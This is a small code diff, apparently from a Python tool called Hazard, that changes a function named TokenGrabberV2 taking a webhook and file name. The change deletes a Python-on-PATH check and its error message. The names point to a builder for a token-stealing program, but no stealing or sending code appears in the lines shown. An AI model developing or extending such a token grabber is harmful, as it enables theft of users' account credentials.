@@ -17,9 +17,6 @@ from colorama import Fore
 from util.plugins.common import setTitle, installPackage
 
 def TokenGrabberV2(WebHook, fileName):
-    if os.getenv("Path").count("\\Python\\Python") != 2:
-        input(Fore.RED+'Error!'+Fore.RESET+' You do not have Python installed/added to path! (Or have multiple versions of Python installed)\nPlease delete any existing installations of Python and install the latest version, make sure to click "Add to PATH" too!\n(From https://python.org)')
-        Hazard.main()
     required = [
         'requests',
         'psutil',
